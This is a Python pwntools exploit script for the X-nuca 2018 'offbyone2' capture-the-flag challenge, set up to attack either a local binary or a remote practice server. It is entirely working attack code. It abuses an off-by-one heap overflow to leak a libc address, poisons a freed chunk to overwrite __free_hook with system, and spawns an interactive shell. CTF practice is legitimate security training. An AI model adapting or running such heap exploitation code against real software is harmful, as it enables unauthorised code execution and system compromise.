import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./X-nuca_2018_offbyone2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./X-nuca_2018_offbyone2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',25661)
			elf=ELF('./X-nuca_2018_offbyone2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('>> ','1')
			io.sendlineafter('length: ',str(a))
			io.sendafter('your note:',b)

		def show(a):
			io.sendlineafter('>> ','3')
			io.sendlineafter('index: ',str(a))

		def delete(a):
			io.sendlineafter('>> ','2')
			io.sendlineafter('index: ',str(a))


		add(0x4f8,'aaa\n')
		add(0xf8,'aaa\n')
		add(0xf8,'aaa\n')
		add(0x4f8,'aaa\n')
		add(0xf8,'aaa\n')
		delete(2)
		add(0xf8,'a'*0xf0+p64(0x700))
		delete(0)
		delete(3)
		add(0x4f8,'/bin/sh\x00\n')
		show(1)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		delete(2)
		add(0x128,'a'*0xf8+p64(0x101)+p64(libc.sym['__free_hook'])+'\n')
		add(0xf8,'a'*0xf0+'\n')
		add(0xf8,p64(system_addr)+'\n')
		delete(0)



		# success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue